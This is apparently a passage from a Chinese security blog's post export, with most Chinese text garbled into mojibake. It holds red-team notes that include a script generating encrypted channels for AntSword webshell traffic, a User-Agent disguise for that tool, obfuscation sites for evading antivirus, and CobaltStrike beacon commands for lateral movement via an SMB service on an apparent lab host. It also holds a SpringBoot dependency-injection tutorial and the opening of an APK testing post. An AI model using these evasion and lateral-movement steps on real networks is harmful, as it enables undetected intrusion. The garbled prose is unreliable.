php_encrypt_clean=php_encrypt_clean,</span><br><span class="line">        encode_final=encode_final</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜åˆ°æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(js_script)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;script_path&quot;</span>: output_file,</span><br><span class="line">        <span class="string">&quot;algorithm&quot;</span>: algorithm,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: key,</span><br><span class="line">        <span class="string">&quot;iv&quot;</span>: iv,</span><br><span class="line">        <span class="string">&quot;key_length&quot;</span>: <span class="built_in">str</span>(key_length),</span><br><span class="line">        <span class="string">&quot;iv_length&quot;</span>: <span class="built_in">str</span>(iv_length),</span><br><span class="line">        <span class="string">&quot;encode&quot;</span>: encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;åŠ å¯†è„šæœ¬ç”Ÿæˆå™¨ - ç”¨äºç”ŸæˆPHPåŠ å¯†å’ŒJSè§£å¯†çš„é…å¥—è„šæœ¬&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--algorithm&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;aes-256-cbc&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">f&quot;åŠ å¯†ç®—æ³•ï¼Œæ”¯æŒ: aes-128-cbc, aes-192-cbc, aes-256-cbc, aes-128-gcm, aes-192-gcm, aes-256-gcm, des-ede3-cbc (é»˜è®¤: aes-256-cbc)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-k&quot;</span>, <span class="string">&quot;--key&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è‡ªå®šä¹‰å¯†é’¥ï¼ˆä¸æŒ‡å®šåˆ™è‡ªåŠ¨ç”Ÿæˆï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--iv&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è‡ªå®šä¹‰å‘é‡ï¼ˆåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸æŒ‡å®šåˆ™è‡ªåŠ¨ç”Ÿæˆï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-kl&quot;</span>, <span class="string">&quot;--key-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;å¯†é’¥é•¿åº¦ï¼ˆå­—èŠ‚ï¼Œä¸æŒ‡å®šåˆ™æ ¹æ®ç®—æ³•è‡ªåŠ¨æ¨æ–­ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-il&quot;</span>, <span class="string">&quot;--iv-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;å‘é‡é•¿åº¦ï¼ˆå­—èŠ‚ï¼Œä¸æŒ‡å®šåˆ™æ ¹æ®ç®—æ³•è‡ªåŠ¨æ¨æ–­ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;--encode&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;base64&quot;</span>, </span><br><span class="line">                      choices=[<span class="string">&quot;base64&quot;</span>, <span class="string">&quot;hex&quot;</span>], </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;æœ€ç»ˆç¼–ç æ–¹å¼ï¼ˆbase64/hexï¼Œé»˜è®¤: base64ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;encryption.js&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è¾“å‡ºè„šæœ¬æ–‡ä»¶åï¼ˆé»˜è®¤: encryption.jsï¼‰&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = generate_encryption_script(</span><br><span class="line">            algorithm=args.algorithm,</span><br><span class="line">            key=args.key,</span><br><span class="line">            iv=args.iv,</span><br><span class="line">            key_length=args.key_length,</span><br><span class="line">            iv_length=args.iv_length,</span><br><span class="line">            encode_final=args.encode,</span><br><span class="line">            output_file=args.output</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†è„šæœ¬ç”ŸæˆæˆåŠŸï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è„šæœ¬è·¯å¾„: <span class="subst">&#123;result[<span class="string">&#x27;script_path&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†ç®—æ³•: <span class="subst">&#123;result[<span class="string">&#x27;algorithm&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;result[<span class="string">&#x27;key&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘é‡(hex): <span class="subst">&#123;result[<span class="string">&#x27;iv&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;key_length&#x27;</span>]&#125;</span>å­—èŠ‚&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘é‡é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;iv_length&#x27;</span>]&#125;</span>å­—èŠ‚&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆç¼–ç : <span class="subst">&#123;result[<span class="string">&#x27;encode&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ³¨æ„ï¼šè¯·å¦¥å–„ä¿å­˜å¯†é’¥å’Œå‘é‡ï¼ŒæœåŠ¡ç«¯éœ€ä½¿ç”¨ç›¸åŒé…ç½®è§£å¯†ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç”Ÿæˆå¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">encryption.js: å¯¹å‘½ä»¤ç»“æœè¿›è¡ŒåŠ å¯†è¿›è¡Œä¼ è¾“ï¼Œå®¢æˆ·ç«¯æ‹¿åˆ°ä¹‹åè¿›è¡Œè§£å¯†ã€‚åœ¨AntSwordä¸Šæ–°å¢è§£ç å™¨ï¼Œå†…å®¹å¤åˆ¶è¿›å»ã€‚</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">######################### User-Agent #########################</span><br><span class="line">antSword-2.1.15/modules/update.js: å°†&quot;User-Agent: antSword/v2.0&quot;æ”¹ä¸ºMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä»£ç å…æ€</p>
 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PHPä»£ç åœ¨çº¿æ··æ·†&amp;åŠ å¯†ï¼šhttps://www.toolfk.com/zh-CN/tools/convert-php.htmlã€https://murk.xiaojieapi.com/#ã€https://uutool.cn/php/</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¡Œä¸ºå…æ€</p>
</li>
</ol>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><h3 id="Vshell"><a href="#Vshell" class="headerlink" title="Vshell"></a>Vshell</h3><p>å›½äº§è‡ªç ”C2å·¥å…·ï¼Œå®¢æˆ·ç«¯ä¸ºWEBå½¢å¼ï¼Œåœ¨é—²é±¼ä¸Šä¹°</p>
<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>è€ç‰Œå·¥å…·ï¼Œç‰¹å¾è¾ƒå¤šï¼Œéœ€è¦é­”æ”¹ï¼ŒLinuxå…¼å®¹è¾ƒå°‘</p>
<h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><h3 id="SMB-CS"><a href="#SMB-CS" class="headerlink" title="SMB-CS"></a>SMB-CS</h3><ol>
<li><p>æ–°å¢ä¸€ä¸ªç”¨æˆ·æ¥æ”¶SMBé€šä¿¡ç›‘å¬å™¨</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210705756.png" alt="image-20251010210705756"></p>
</li>
<li><p>ç”Ÿæˆä¸€ä¸ªåŸºäºSMBé€šä¿¡çš„beacon</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210749738.png" alt="image-20251010210749738"></p>
</li>
<li><p>é€šè¿‡è‚‰é¸¡å°†beaconä¸Šä¼ åˆ°é¶æ ‡ä¸Šï¼Œå¹¶ä¸”è§¦å‘æ‰§è¡Œ &amp;&amp; æ“æ§è‚‰é¸¡ä¸»åŠ¨è¿æ¥smb-beaconï¼Œå®Œæˆé“¾è·¯æ­å»º</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211001369.png" alt="image-20251010211001369"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell copy smb_update.exe \\owa.god.org\c$</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org create SMBupdate binpath= <span class="string">&quot;cmd.exe /c c:\smb_update.exe&quot;</span></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org start SMBupdate</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash"><span class="built_in">link</span> owa.god.org</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211458999.png" alt="image-20251010211458999"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>APT</tag>
        <tag>çº¢é˜Ÿ</tag>
        <tag>æ¸—é€</tag>
        <tag>web</tag>
        <tag>å†…ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBootå…¥é—¨</title>
    <url>/SpringBootDev.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="å¿«é€Ÿå¯åŠ¨"><a href="#å¿«é€Ÿå¯åŠ¨" class="headerlink" title="å¿«é€Ÿå¯åŠ¨"></a>å¿«é€Ÿå¯åŠ¨</h1><h2 id="äº§å“èƒŒæ™¯"><a href="#äº§å“èƒŒæ™¯" class="headerlink" title="äº§å“èƒŒæ™¯"></a>äº§å“èƒŒæ™¯</h2><ol>
<li><p>Springç”Ÿæ€ä¼—å¤šï¼Œä¸æ­¢ä¸€ä¸¤ä¸ªæ¡†æ¶è€Œå·²ï¼Œä¸‹å›¾æ˜¯ä¸€äº›Springç”Ÿæ€ä¸­æ¯”è¾ƒå‡ºåçš„æ¡†æ¶ã€‚å¯ä»¥çœ‹åˆ°ä»æ•°æ®åº“ã€webã€cloudåˆ°Androidã€LDAPç­‰ç­‰ï¼Œå¾ˆå¤šæ–¹å‘éƒ½æœ‰æ¡†æ¶ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
</li>
<li><p>SpringFrameworkï¼ˆä»¥ä¸‹ç®€ç§°SFï¼‰æ˜¯Springç”Ÿæ€ä¸­æœ€é‡è¦çš„ä¸€ç¯ã€æ˜¯æœ€æ ¹æœ¬çš„åŸºçŸ³ï¼Œç®€å•ç†è§£Springä¸­å…¶ä»–æ¡†æ¶éƒ½æ¥è‡ªäºSFï¼Œæ‰€ä»¥ä¹Ÿæœ‰å¾ˆå¤šäººæŠŠSFç®€ç§°ä¸ºSpringï¼Œå°±åƒæŠŠDBMSç®€ç§°ä¸ºæ•°æ®åº“æ˜¯ä¸€æ ·çš„é“ç†ã€‚SpringBootï¼ˆä»¥ä¸‹ç®€ç§°SBï¼‰æ˜¯åŸºäºSFï¼Œåœ¨webæ–¹å‘å¼€å‘å‡ºæ¥çš„ä¸€æ¬¾æ¡†æ¶ï¼ˆå…¶å®SFä¸­çš„SpringMVCæœ¬å°±å¯ä»¥å¼€å‘webï¼Œä»¥å‰çš„â€œSSMâ€ä¸‰ä»¶å¥—ï¼Œåªæ˜¯SBæ›´åŠ ä¸“ä¸šï¼Œé€æ¸ä»£æ›¿äº†SSMï¼‰ã€‚SBå¯¹äºå¼€å‘è€…è€Œè¨€æ–¹ä¾¿å¾ˆå¤šï¼Œç°åœ¨Javaåç«¯å‡ ä¹éƒ½é‡‡ç”¨SBè¿›è¡Œå¼€å‘ï¼Œè€Œä¸”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSBè¿˜å¯ä»¥å’Œå…¶ä»–çš„ä¸€äº›å·¥å…·&#x2F;æ¡†æ¶ç›¸ç»“åˆï¼Œä½¿å¾—webæ¡†æ¶å¯å®šåˆ¶åŒ–ç¨‹åº¦æ›´é«˜ï¼Œæ›´åŠ å—åˆ°å¼€å‘è€…çš„é’çã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
</li>
<li><p>SBä¸SFçš„å¯¹åº”å…³ç³»</p>
<table>
<thead>
<tr>
<th align="center">Spring Boot ç‰ˆæœ¬</th>
<th align="center">å¯¹åº”çš„ Spring Framework ç‰ˆæœ¬èŒƒå›´</th>
<th align="center">å‘å¸ƒæ—¶é—´</th>
<th align="center">æ”¯æŒçŠ¶æ€</th>
</tr>
</thead>
<tbody><tr>
<td align="center">3.3.x</td>
<td align="center">6.2.x</td>
<td align="center">2024 å¹´</td>
<td align="center">æœ€æ–°ç‰ˆæœ¬ï¼ŒæŒç»­æ›´æ–°</td>
</tr>
<tr>
<td align="center">3.2.x</td>
<td align="center">6.1.x</td>
<td align="center">2023 å¹´åº•</td>
<td align="center">æ´»è·ƒæ”¯æŒä¸­ï¼ˆOSS æ”¯æŒè‡³ 2025 å¹´ï¼‰</td>
</tr>
<tr>
<td align="center">3.1.x</td>
<td align="center">6.0.x</td>
<td align="center">2023 å¹´</td>
<td align="center">å·²åœæ­¢ OSS æ”¯æŒï¼Œå•†ä¸šæ”¯æŒä¸­</td>
</tr>
<tr>
<td align="center">3.0.x</td>
<td align="center">6.0.xï¼ˆæ—©æœŸç‰ˆæœ¬ï¼‰</td>
<td align="center">2022 å¹´åº•</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.7.xï¼ˆLTSï¼‰</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">é•¿æœŸæ”¯æŒï¼ˆè‡³ 2025 å¹´ 11 æœˆï¼‰</td>
</tr>
<tr>
<td align="center">2.6.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.5.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.4.x</td>
<td align="center">5.3.x</td>
<td align="center">2020 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.3.x</td>
<td align="center">5.2.x</td>
<td align="center">2020 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.2.x</td>
<td align="center">5.2.x</td>
<td align="center">2019 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.1.xï¼ˆLTSï¼‰</td>
<td align="center">5.1.x</td>
<td align="center">2018 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">2.0.x</td>
<td align="center">5.0.x</td>
<td align="center">2018 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
<tr>
<td align="center">1.5.xï¼ˆLTSï¼‰</td>
<td align="center">4.3.x</td>
<td align="center">2017 å¹´</td>
<td align="center">å·²åœæ­¢æ”¯æŒ</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="å¯åŠ¨é¡¹ç›®"><a href="#å¯åŠ¨é¡¹ç›®" class="headerlink" title="å¯åŠ¨é¡¹ç›®"></a>å¯åŠ¨é¡¹ç›®</h2><ol>
<li><p>é€šè¿‡SpringBootï¼ˆä»¥ä¸‹ç®€ç§°SBï¼‰æ’ä»¶å¿«é€Ÿåˆ›å»ºSBé¡¹ç›®</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
</li>
<li><p>é¡¹ç›®ç»“æ„</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
</li>
<li><p>å…³é”®ä»£ç å±•ç¤ºï¼ˆIOC&#x2F;DIï¼‰</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡<span class="doctag">@Component</span>æ³¨è§£ï¼Œå°†è¿™ä¸ªç±»æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶ï¼Œäº¤ç»™SBæ¡†æ¶è¿›è¡Œç®¡ç†****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡<span class="doctag">@Component</span>æ³¨è§£ï¼Œå°†è¿™ä¸ªç±»æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶ï¼Œäº¤ç»™SBæ¡†æ¶è¿›è¡Œç®¡ç†****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//å¦‚æœæœ‰å¤šä¸ªç±»å‹ç›¸åŒçš„ç»„ä»¶ï¼Œéœ€è¦æ ¹æ®å…·ä½“çš„ç±»ï¼ŒæŒ‡å®šè¦å…³è”å“ªä¸€ä¸ªç»„ä»¶</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//è‡ªåŠ¨å…³è”ç±»ä¸ºUserDaoçš„ç»„ä»¶</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//è¿™ä¸‰è¡Œä»£ç ç›¸å½“äºï¼šUserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡æ³¨è§£ï¼Œå‘Šè¯‰SBè¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//å‘Šè¯‰SBï¼Œè¦ç®¡ç†å“ªä¸ªåŒ…ä¸‹é¢çš„ç»„ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>å•å…ƒæµ‹è¯•</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//å¦‚æœæŠ¥é”™ï¼Œåœ¨pom.xmlä¸­æ·»åŠ junitä¾èµ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//è·å–SBå®¹å™¨ï¼ˆè¿™é‡Œæ˜¯æ ¹æ®JavaConfigè¿™ä¸ªç±»åˆ›å»ºå‡ºæ¥çš„å®¹å™¨ï¼‰</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//è·å–å®¹å™¨ä¸­çš„ä¸€ä¸ªBean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¨‹åºè¾“å‡ºï¼šUserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DIä¹‹å) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>åç«¯</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>APKå®‰å…¨æµ‹è¯•</title>
    <url>/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<blockquote>
<p>Referenceï¼š</p>
<ol>
<li><a href="https://blog.csdn.net/qq_40037555/article/details/151819602">ã€APKå®‰å…¨ã€‘APKåº”ç”¨å®‰å…¨æµ‹è¯•ç­–ç•¥-CSDNåšå®¢</a></li>
<li><a href="https://xz.aliyun.com/news/11538">Android APP-å››å¤§ç»„ä»¶å®‰å…¨æµ‹è¯•-å…ˆçŸ¥ç¤¾åŒº</a></li>
<li><a href="https://www.jianshu.com/p/826439b24467">https://www.jianshu.com/p/826439b24467</a></li>
<li><a href="https://www.cnblogs.com/hetianlab/p/19048752">Androidå››å¤§ç»„ä»¶å®‰å…¨æ¼æ´å®æˆ˜ - èšæ™¯ç½‘å®‰å®éªŒå®¤ - åšå®¢å›­</a></li>
</ol>
</blockquote>
<h2 id="How-to-sniff-packet"><a href="#How-to-sniff-packet" class="headerlink" title="How to sniff packet?"></a>How to sniff packet?</h2><ol>
<li><p>There is just a detection for client to check system cert.</p>
<ul>
<li><p>Import ca-cert from burp: burp.der</p>
</li>
<li><p>Transform .der to .pem through openssl</p>
